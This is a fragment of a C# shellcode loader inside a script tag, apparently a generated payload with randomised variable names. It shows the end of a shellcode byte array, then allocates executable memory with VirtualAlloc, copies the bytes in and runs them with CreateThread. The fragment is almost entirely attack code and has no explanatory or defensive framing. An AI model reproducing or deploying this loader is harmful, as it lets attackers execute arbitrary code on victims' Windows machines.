...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr fCU = VirtualAlloc(IntPtr.Zero,(UIntPtr)d4bYQcpM3Zq.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(d4bYQcpM3Zq,0,fCU,d4bYQcpM3Zq.Length);
        IntPtr pSZz1biXMc = IntPtr.Zero;
        IntPtr iAr_DMzHgRP = CreateThread(IntPtr.Zero,UIntPtr.Zero,fCU,IntPtr.Zero,0,ref pSZz1biXMc);
    }
</script>
